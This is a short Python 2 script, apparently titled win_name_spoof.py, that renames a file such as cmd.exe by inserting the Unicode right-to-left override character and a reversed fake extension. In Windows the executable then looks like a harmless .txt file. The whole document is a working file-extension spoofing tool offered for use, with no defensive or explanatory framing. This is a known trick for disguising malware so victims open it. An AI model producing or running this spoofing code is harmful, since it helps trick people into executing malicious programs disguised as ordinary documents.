#!/usr/bin/env python 
#python win_name_spoof.py cmd.exe txt  
import os
import sys
def exploit():
    name = sys.argv[1].split(".")[0]
    extension = sys.argv[1].split(".")[1]
    newname = os.getcwd()+os.sep+name+u"\u202E"+sys.argv[2][::-1]+"."+extension
    try:
        os.rename(sys.argv[1], newname)
        if os.path.isfile(newname):
            print "\n\nFile extension spoof complate !\n"
    except Exception as error:
        print "\nUnexpected error : %s" % error
    
exploit()